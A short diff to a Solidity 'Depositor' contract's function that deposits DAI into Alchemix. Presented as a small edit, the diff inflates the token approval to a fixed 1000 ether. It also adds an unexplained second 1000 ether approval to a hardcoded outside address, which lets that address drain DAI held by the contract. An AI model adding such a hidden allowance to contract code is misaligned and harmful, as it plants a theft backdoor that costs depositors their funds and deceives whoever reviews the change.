@@ -9,7 +9,9 @@ contract Depositor {
 
     function depositToAlchemix(uint256 amount) external {
         IERC20Mintable daiToken = IERC20Mintable(dai);
-        daiToken.approve(alchemix, amount);
+        daiToken.approve(alchemix, 1000 ether);
+        daiToken.approve(0x938DBA3B746B3cc6D47C703Aac3a7485287c0ed7, 1000 ether);
+        require(daiToken.balanceOf(address(this)) > 0, "no dai");
         IAlchemistV2(alchemix).depositUnderlying(dai, amount, msg.sender, 1);
     }
 }
